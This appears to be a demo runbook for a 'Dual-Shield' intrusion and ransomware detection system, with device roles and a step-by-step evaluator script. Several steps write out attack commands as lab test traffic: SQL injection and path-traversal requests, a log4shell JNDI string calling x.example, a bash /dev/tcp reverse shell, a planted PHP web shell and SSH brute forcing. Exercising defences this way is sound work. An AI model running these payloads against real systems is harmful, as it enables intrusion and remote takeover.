# Dual-Shield evaluator demo: 5 laptops + 3 phones

## Roles
| Device | Role | Runs |
|---|---|---|
| Laptop 1 (**D**) | Dashboard + Fabric chain (Linux/WSL) | `multi/start_D.sh`, dashboard on :3000, projector/screen |
| Laptop 2 (**T**) | Target, Linux | `sudo multi/start_T.sh` (SSH, parser, flood/login/ARP detectors, Layer 2 guard) |
| Laptop 3 (**P**) | Peer node, Linux | `sudo multi/start_P.sh` (listens to the chain, blocks too) |
| Laptop 4 (**A**) | Attacker | `multi/demo_menu_A.sh` |
| Laptop 5 (**W**) | Windows target (Layer 1 logon watch + Layer 2) | `windows\start_target.ps1` (v10; never run on real Windows yet: rehearse it) |
| Phone 1 | Wi-Fi hotspot / router for everyone | no software |
| Phone 2 | Second attacker (Termux: `pkg install nmap openssh hydra`) | same attacks as A, shows "many sources" |
| Phone 3 | Evaluator's view: opens `http://<D_IP>:3000` | browser only |

Phones cannot run the shield itself. They are attackers and viewers. Say so; it is true.

## Before the evaluator arrives (one hour)
1. All devices on Phone 1's hotspot. Write each IP; put them in `multi/config.env` on every laptop (same file).
2. Clocks: sync on every laptop (timeline compares laptops).
3. D first, then T, then P, each waits for READY. `multi/check_net.sh` from any laptop must be all green.
4. Set in `config.env`: `FLOOD=1`, `LOGIN_WATCH=1`, `PEER_DETECT=1`, `CONTAIN=dry` (safe default for live demo).
5. Do the whole script below once, alone. Then restart T and P to clear blocks.
6. Keep a screen recording of a good run as fallback.

## Script (about 15 minutes)
| # | Do | Expected on dashboard / terminals |
|---|---|---|
| 1 | Show D: chain live, both layer pills green | Fabric chain, 2 peers, 1 or 3 orderers |
| 2 | A: menu **1** SSH brute force | T `[FAIL]x3 [BLOCKED]`, P blocks it too, threat CONFIRMED (K=2), A shows BLOCKED |
| 3 | Phone 2: slow guess / same attack | second source blocked; peers learn it from the chain |
| 4 | A: menu **2** slow spray | login_watch alert (a plain fail2ban would miss it) |
| 5 | A: menu **3** port scan, **4** SYN flood | flood_detector alerts and block |
| 6 | Show blocked lists on T and P, timeline, "this run" times | local block time, peer block time |
| 7 | T: `python3 network/sensor_guard.py --demo --dry` | simulated sensor attacks flagged |
| 8 | Governance: propose + approve a change on the dashboard; slashing of a lying node | proposal count, stake change |
| 9 | Layer 2 on T: `multi/ransomware_trigger.sh` | flagged files, kill, then **Roll back to clean state**: ANCHOR_MATCH, 10 of 10 |
| 10 | Layer 2 types: on T `python3 ransomware/test_types.py` | crypto / wiper / double-extortion / exfiltration / note-only classified |
| 11 | W: Windows logon failures or simulated ransomware in `C:\DualShieldTest` | only if rehearsed; otherwise show the recorded run |
| 12 | Tamper: stop a service on T | selfguard restarts it / raises alert |
| 13 | Failover (optional, needs `ORDERERS=3`): `network.sh stop-orderer 2`, repeat step 2 | still commits |

## Say these limits yourself (evaluators respect it)
- Only T detects attacks; the second K=2 report is scripted unless `PEER_DETECT=1`.
- Orderers and both peers run on D, so the blockchain is one machine's trust, not three organisations'.
- Ransomware is a mock inside the sample folder; real-sample testing was done only in an isolated VM (if you do it).
- Windows support is implemented and tested with simulated commands; real-machine results come from laptop 5.
- Phones are attackers/viewers only; no DDoS beyond the host's own capacity is claimed.

## v13.20 to v13.25 additions (web, host, node attacks, alerts, report)
Extra `config.env` keys for these steps: `WEB_GUARD=1`, `HOST_GUARD=1`, `BLOCK_TTL=45` (a laptop can be attacked again after 45 s), `ALERT_TELEGRAM_TOKEN`/`ALERT_TELEGRAM_CHAT` (phone alert; test with `python3 multi/alert_notify.py --test`).
With `PRODUCTION=1` the demo ransomware button needs `AGENT_DEMO=1` on T (restart T after setting it); it WIPES the vault: remove it after the demo.
Install nginx on T first (`sudo apt install -y nginx`) and put a page in `/var/www/html`. In the commands below `$T_IP` is T's address.
| # | Who | Do | Expected |
|---|---|---|---|
| 14 | A2 | `curl -s -o /dev/null "http://$T_IP/item?id=1%20UNION%20SELECT%20user,pass%20FROM%20users"` | SQL injection: A2 blocked at once; Attack events tab shows web attack sqli |
| 15 | A | `for p in .env .git/config backup.zip shell.php; do curl -s -o /dev/null http://$T_IP/$p; done` and `curl -s -o /dev/null -A sqlmap http://$T_IP/` | probes and scanner score add up to a block |
| 16 | A2 | `curl -s -o /dev/null --path-as-is "http://$T_IP/f?p=../../../etc/passwd"` and a log4shell URL `/r?c=%24%7Bjndi%3Aldap%3A%2F%2Fx.example%2Fa%7D` | traversal and log4shell blocked |
| 17 | T | `echo HACKED | sudo tee /var/www/html/index.html` and `echo '<?php echo 1;?>' | sudo tee /var/www/html/shell.php` | page restored from the clean snapshot; web shell quarantined |
| 18 | A2, then T | A2: `nc -lvnp 4444`; T (new terminal): `bash -i >& /dev/tcp/A2_IP/4444 0>&1` | reverse shell killed, A2 blocked (HOST_ATTACK) |
| 19 | T | `cp /bin/sleep /tmp/xmrig && /tmp/xmrig 600 &` | harmless copy named like a miner: killed and quarantined |
| 20 | T | `python3 -m http.server 8999 &` then kill it | node_watch: new listening port alert within about a minute |
| 21 | D | Attack events tab, button **Incident report (print / PDF)** | one printable report of steps 14 to 20 |
| 22 | phone | Telegram | alerts for the events above (only severity `ALERT_MIN` and higher) |
Order tip: web and host attacks block the source address; alternate A and A2, or wait `BLOCK_TTL` seconds.
